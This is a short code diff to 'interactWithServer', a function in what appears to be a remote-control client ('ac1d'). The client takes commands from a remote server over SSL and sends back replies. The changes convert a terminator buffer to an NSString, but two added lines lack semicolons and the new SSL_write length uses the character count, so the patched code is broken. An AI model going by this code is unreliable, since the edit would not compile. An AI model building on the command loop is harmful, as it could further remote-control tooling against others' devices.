@@ -104,11 +104,11 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     ac1d_base->client_ssl = client_ssl;
     
     char buffer[2048] = "";
-    SSL_read(client_ssl, buffer, sizeof(buffer));
-    char *terminator = (char*)buffer;
+    SSL_read(client_ssl, buffer, sizeof(buffer))
+    NSString *terminator = [NSString stringWithFormat:@"%s", buffer]
     memset(buffer, '\0', 2048);
     
-    if (debug) printf("[i] Current client terminator: %s\n", terminator);
+    if (debug) printf("[i] Current client terminator: %s\n", [terminator UTF8String]);
     
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
@@ -125,7 +125,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
         } else {
             if (debug) printf("[-] Unrecognized command!\n");
             sendString(@"error");
-            SSL_write(client_ssl, terminator, (int)strlen(terminator));
+            SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
         }
         memset(buffer, '\0', 2048);
     }
